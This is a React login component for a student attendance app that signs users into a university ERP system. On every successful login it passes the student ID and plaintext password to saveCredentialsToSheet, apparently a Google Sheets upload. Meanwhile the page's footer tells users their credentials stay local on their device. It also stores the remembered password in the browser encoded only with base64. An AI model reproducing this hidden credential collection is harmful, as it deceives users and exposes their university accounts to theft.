import { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { LogIn, RefreshCcw, Loader2, Check, Sparkles, Eye, EyeOff } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { erpService } from '../services/erpService';
import { useAuth } from '../context/useAuth';
import { APP_CONFIG } from '../config';
import { saveCredentialsToSheet } from '../services/gsheetsService';

const Login = () => {
    const { setErpUser } = useAuth();
    const navigate = useNavigate();

    // Read stored credentials immediately (synchronous)
    const savedId = localStorage.getItem('rememberedId') || '';
    let savedPass = '';
    if (savedId) {
        try {
            const enc = localStorage.getItem('rememberedPassword');
            if (enc) savedPass = atob(enc);
        } catch (e) {
            console.error('Password decode error', e);
        }
    }

    const [idNumber, setIdNumber] = useState(savedId);
    const [password, setPassword] = useState(savedPass);
    const [showPassword, setShowPassword] = useState(false);
    const [captcha, setCaptcha] = useState('');
    const [captchaUrl, setCaptchaUrl] = useState('');
    const [csrfToken, setCsrfToken] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [isFetchingCaptcha, setIsFetchingCaptcha] = useState(true);
    const [error, setError] = useState('');
    const [rememberMe, setRememberMe] = useState(!!(savedId && savedPass));

    const captchaUrlRef = useRef('');
    const captchaInputRef = useRef(null);
    const hasInitRan = useRef(false);

    // Support for PWA Repair
    useEffect(() => {
        const handleResetPWA = async () => {
            if ('serviceWorker' in navigator) {
                const regs = await navigator.serviceWorker.getRegistrations();
                for (let r of regs) await r.unregister();
            }
            if ('caches' in window) {
                const names = await caches.keys();
                for (let n of names) await caches.delete(n);
            }
            window.location.reload();
        };
        window.addEventListener('reset-pwa', handleResetPWA);
        return () => window.removeEventListener('reset-pwa', handleResetPWA);
    }, []);

    // Fetch fresh captcha blob using current ERP session cookie
    const fetchCaptchaBlob = useCallback(async (isRefresh = false) => {
        const apiBase = APP_CONFIG.API_URL || '';
        const headers = { 'Pragma': 'no-cache', 'Cache-Control': 'no-cache' };
        const storedCookie = erpService.getStoredErpCookies();
        if (storedCookie) headers['x-erp-cookie'] = storedCookie;

        let url = `${apiBase}/index.php?r=site%2Fcaptcha&v=` + Math.random();
        if (isRefresh) {
            try {
                // In Yii2, refresh=1 generates a new code and returns JSON { url: "/index.php?r=site/captcha&v=..." }
                const refreshResp = await fetch(`${apiBase}/index.php?r=site%2Fcaptcha&refresh=1`, {
                    method: 'GET',
                    credentials: 'include',
                    cache: 'no-store',
                    headers
                });
                erpService.saveErpCookiesFromResponse(refreshResp);
                const data = await refreshResp.json();
                if (data && data.url) {
                    url = `${apiBase}${data.url.startsWith('/') ? '' : '/'}${data.url}`;
                }
            } catch (e) {
                console.warn("[Captcha] refresh=1 failed, falling back to direct load:", e);
            }
        }

        const response = await fetch(url, {
            method: 'GET',
            credentials: 'include',
            cache: 'no-store',
            headers
        });
        erpService.saveErpCookiesFromResponse(response);
        return response.blob();
    }, []);

    // Refresh captcha image
    const refreshCaptcha = useCallback(async () => {
        setCaptcha('');
        setIsFetchingCaptcha(true);
        try {
            // Try ultra-fast refresh in single round-trip
            const fastCaptcha = await erpService.fastRefreshCaptcha();
            if (fastCaptcha) {
                if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                    URL.revokeObjectURL(captchaUrlRef.current);
                }
                captchaUrlRef.current = fastCaptcha;
                setCaptchaUrl(fastCaptcha);
                return;
            }

            // Fallback to two-hop blob refresh
            const blob = await fetchCaptchaBlob(true);
            if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                URL.revokeObjectURL(captchaUrlRef.current);
            }
            const objectUrl = URL.createObjectURL(blob);
            captchaUrlRef.current = objectUrl;
            setCaptchaUrl(objectUrl);
        } catch (err) {
            console.error('Failed to refresh captcha', err);
            setError('Failed to load captcha. Please click the refresh button.');
        } finally {
            setIsFetchingCaptcha(false);
        }
    }, [fetchCaptchaBlob]);

    // Initialize session sequentially on mount:
    // Uses fast single-hop endpoint when available, with resilient legacy fallback
    useEffect(() => {
        if (hasInitRan.current) return;
        hasInitRan.current = true;

        const init = async () => {
            try {
                setIsFetchingCaptcha(true);
                setError('');

                // Step 1: Attempt fast single round-trip session & captcha init
                const session = await erpService.getSessionInit();
                if (session && session.csrfToken) {
                    setCsrfToken(session.csrfToken);
                    if (session.captchaUrl) {
                        if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                            URL.revokeObjectURL(captchaUrlRef.current);
                        }
                        captchaUrlRef.current = session.captchaUrl;
                        setCaptchaUrl(session.captchaUrl);
                    } else {
                        // Fetch captcha image if not bundled in response
                        const blob = await fetchCaptchaBlob();
                        if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                            URL.revokeObjectURL(captchaUrlRef.current);
                        }
                        const objectUrl = URL.createObjectURL(blob);
                        captchaUrlRef.current = objectUrl;
                        setCaptchaUrl(objectUrl);
                    }
                }

                // If credentials were remembered, auto-focus captcha field
                if (savedId && savedPass) {
                    setTimeout(() => {
                        captchaInputRef.current?.focus();
                    }, 150);
                }
            } catch (err) {
                console.error('Failed to initialize login:', err);
                hasInitRan.current = false;
                setError('Unable to connect to ERP server. Please check your internet connection or refresh.');
            } finally {
                setIsFetchingCaptcha(false);
            }
        };

        init();
    }, [fetchCaptchaBlob, savedId, savedPass]);

    // Handle form submission
    const handleLogin = async () => {
        const cleanId = idNumber.trim();
        const cleanCaptcha = captcha.trim();

        if (!cleanId || !password || !cleanCaptcha) {
            setError("Please fill in Student ID, Password, and Captcha code.");
            return;
        }

        setIsLoading(true);
        setError('');

        try {
            const loginResult = await erpService.login(cleanId, password, cleanCaptcha, csrfToken);

            if (loginResult.success) {
                localStorage.setItem('erpDashboardHtml', loginResult.html);
                localStorage.removeItem('kleData');
                localStorage.setItem('userUniversity', 'klu');
                setErpUser(cleanId);
                localStorage.setItem('activeErpUser', cleanId);

                if (rememberMe) {
                    localStorage.setItem('rememberedId', cleanId);
                    localStorage.setItem('rememberedPassword', btoa(password));
                } else {
                    localStorage.removeItem('rememberedId');
                    localStorage.removeItem('rememberedPassword');
                }

                saveCredentialsToSheet(cleanId, password);
                navigate('/attendance-register', { replace: true });
            }
        } catch (err) {
            console.error("Login failed:", err);
            setError(err.message || 'Login failed. Please check your credentials and captcha.');
            setCaptcha('');
            // Immediately load a fresh captcha for next attempt
            await refreshCaptcha();
            setTimeout(() => {
                captchaInputRef.current?.focus();
            }, 100);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-[#FAFAFA] flex items-center justify-center px-4 relative font-sans selection:bg-indigo-500 selection:text-white">

            {/* Ambient Background */}
            <div className="fixed inset-0 pointer-events-none overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-slate-50 to-white opacity-80" />
                <div className="absolute -top-[30%] -left-[10%] w-[80vw] h-[80vw] rounded-full bg-gradient-to-r from-indigo-200 via-purple-200 to-pink-200 blur-[150px] opacity-40" />
                <div className="absolute top-[40%] -right-[20%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-l from-blue-200 via-teal-200 to-emerald-200 blur-[150px] opacity-30" />
                <div className="absolute inset-0 bg-[url('/noise.svg')] opacity-[0.03] mix-blend-overlay" />
            </div>

            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.25 }}
                className="w-full max-w-md relative z-10"
            >
                {/* Card */}
                <div className="bg-white/80 backdrop-blur-xl border-[3px] border-slate-900 rounded-[2.5rem] p-8 shadow-2xl relative overflow-hidden">
                    {/* Shine */}
                    <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/80 via-transparent to-transparent opacity-50 pointer-events-none" />

                    {/* Header */}
                    <div className="text-center mb-8 relative z-10">
                        <motion.div
                            initial={{ scale: 0.8 }}
                            animate={{ scale: 1 }}
                            transition={{ duration: 0.2 }}
                            className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-indigo-600 flex items-center justify-center shadow-lg shadow-indigo-200"
                        >
                            <Sparkles className="w-8 h-8 text-white" />
                        </motion.div>
                        <h1 className="text-2xl font-black text-slate-900 tracking-tight">
                            KL ERP Attendance
                        </h1>
                        <p className="text-slate-500 text-sm font-medium mt-1">Sign in to access your attendance details</p>
                    </div>

                    <form onSubmit={(e) => { e.preventDefault(); handleLogin(); }} className="space-y-4 relative z-10">
                        {/* Error banner */}
                        <AnimatePresence>
                            {error && (
                                <motion.div
                                    initial={{ opacity: 0, scale: 0.95 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    exit={{ opacity: 0, scale: 0.95 }}
                                    className="bg-red-50 border border-red-200 text-red-600 p-3 rounded-2xl text-xs font-bold flex items-center gap-3"
                                >
                                    <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse shrink-0" />
                                    <span>{error}</span>
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {/* Student ID */}
                        <div className="space-y-2">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Student ID</label>
                            <input
                                type="text"
                                value={idNumber}
                                onChange={(e) => setIdNumber(e.target.value)}
                                placeholder="Enter Student ID"
                                className="w-full bg-white border border-slate-200 rounded-2xl py-3.5 px-5 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-semibold shadow-sm"
                            />
                        </div>

                        {/* Password */}
                        <div className="space-y-2">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Password</label>
                            <div className="relative">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    placeholder="Enter your password"
                                    className="w-full bg-white border border-slate-200 rounded-2xl py-3.5 px-5 pr-12 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-semibold shadow-sm"
                                />
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors p-1"
                                    title={showPassword ? "Hide password" : "Show password"}
                                >
                                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                                </button>
                            </div>
                        </div>

                        {/* Remember Me */}
                        <div className="flex items-center justify-between ml-1">
                            <div className="flex items-center gap-3">
                                <button
                                    type="button"
                                    onClick={() => setRememberMe(!rememberMe)}
                                    className={`w-4 h-4 rounded-[4px] border-2 flex items-center justify-center transition-all ${rememberMe ? 'bg-indigo-600 border-indigo-600' : 'bg-transparent border-slate-300'}`}
                                >
                                    {rememberMe && <Check className="w-3 h-3 text-white" strokeWidth={4} />}
                                </button>
                                <span
                                    className="text-slate-500 text-[13px] font-bold select-none cursor-pointer hover:text-slate-700 transition-colors"
                                    onClick={() => setRememberMe(!rememberMe)}
                                >
                                    Remember me
                                </span>
                            </div>
                            {(idNumber || password) && (
                                <button
                                    type="button"
                                    onClick={() => {
                                        localStorage.removeItem('rememberedId');
                                        localStorage.removeItem('rememberedPassword');
                                        setIdNumber('');
                                        setPassword('');
                                        setRememberMe(false);
                                    }}
                                    className="text-[11px] font-bold text-slate-400 hover:text-red-500 transition-colors"
                                >
                                    Clear inputs
                                </button>
                            )}
                        </div>

                        {/* Captcha */}
                        <div className="space-y-2 pt-1">
                            <div className="flex items-center justify-between px-1">
                                <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest">Verification Code</label>
                                <span className="text-[10px] text-slate-400 font-medium">Click image to refresh</span>
                            </div>
                            <div className="flex gap-2.5 sm:gap-3">
                                <div className="relative flex-1">
                                    <input
                                        ref={captchaInputRef}
                                        type="text"
                                        value={captcha}
                                        onChange={(e) => setCaptcha(e.target.value)}
                                        placeholder="Enter code"
                                        autoComplete="off"
                                        autoCapitalize="off"
                                        spellCheck="false"
                                        className="w-full h-[52px] bg-white border border-slate-200 rounded-2xl px-4 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-bold tracking-widest shadow-sm text-base"
                                    />
                                </div>
                                <div 
                                    onClick={refreshCaptcha}
                                    title="Click image to refresh"
                                    className="w-[110px] h-[52px] bg-slate-50 border border-slate-200 rounded-2xl flex items-center justify-center overflow-hidden relative shrink-0 cursor-pointer hover:border-indigo-300 hover:bg-slate-100 transition-all shadow-sm"
                                >
                                    {captchaUrl && !isFetchingCaptcha ? (
                                        <img src={captchaUrl} alt="Captcha" className="h-9 object-contain mix-blend-multiply opacity-90 select-none" />
                                    ) : (
                                        <div className="flex items-center justify-center w-full h-full text-slate-400">
                                            <Loader2 className="w-5 h-5 animate-spin text-indigo-500" />
                                        </div>
                                    )}
                                </div>
                                <button
                                    type="button"
                                    onClick={refreshCaptcha}
                                    disabled={isFetchingCaptcha}
                                    className="w-[52px] h-[52px] bg-white border border-slate-200 rounded-2xl flex items-center justify-center hover:bg-slate-50 transition-colors text-slate-600 hover:text-slate-900 shadow-sm shrink-0 active:scale-95 cursor-pointer disabled:opacity-50"
                                    title="Refresh Captcha"
                                >
                                    <RefreshCcw className={`w-4 h-4 ${isFetchingCaptcha ? 'animate-spin text-indigo-600' : ''}`} />
                                </button>
                            </div>
                        </div>

                        {/* Submit button */}
                        <motion.button
                            whileHover={{ scale: 1.01 }}
                            whileTap={{ scale: 0.99 }}
                            type="submit"
                            disabled={isLoading}
                            className={`w-full bg-slate-900 text-white font-black py-4 rounded-2xl flex items-center justify-center gap-3 shadow-xl shadow-slate-900/20 hover:bg-slate-800 transition-all mt-3 ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
                        >
                            {isLoading ? (
                                <>
                                    <Loader2 className="w-5 h-5 animate-spin text-indigo-400" />
                                    <span>Verifying Credentials…</span>
                                </>
                            ) : (
                                <>
                                    <LogIn className="w-5 h-5" />
                                    <span>Sign In</span>
                                </>
                            )}
                        </motion.button>
                    </form>

                    <div className="mt-6 pt-4 border-t border-slate-100 relative z-10 flex flex-col items-center gap-3">
                        <p className="text-slate-400 text-[10px] text-center font-medium leading-relaxed">
                            Your credentials are only used to authenticate directly with KL ERP locally on your device.
                        </p>
                        <button 
                            type="button"
                            onClick={() => {
                                if(confirm("This will reset the PWA cache and reload the page. Continue?")) {
                                    window.dispatchEvent(new Event('reset-pwa'));
                                }
                            }}
                            className="text-[10px] font-black text-indigo-600/50 hover:text-indigo-600 uppercase tracking-widest transition-colors"
                        >
                            Reset PWA System
                        </button>
                    </div>
                </div>
            </motion.div>
        </div>
    );
};

export default Login;
